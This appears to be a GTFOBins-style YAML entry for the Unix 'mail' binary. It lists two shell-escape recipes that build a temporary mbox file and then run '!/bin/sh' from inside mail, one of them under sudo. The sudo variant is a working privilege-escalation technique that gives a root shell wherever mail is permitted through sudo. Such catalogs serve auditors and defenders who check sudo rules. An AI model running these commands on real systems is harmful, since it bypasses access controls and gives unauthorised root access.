---
functions:
  shell:
    - description: This creates a valid Mbox file which may be required by the binary.
      code: |
        TF=$(mktemp)
        echo "From nobody@localhost $(date)" > $TF
        mail -f $TF
        !/bin/sh
  sudo:
    - description: This creates a valid Mbox file which may be required by the binary.
      code: |
        TF=$(mktemp)
        echo "From nobody@localhost $(date)" > $TF
        sudo mail -f $TF
        !/bin/sh
---
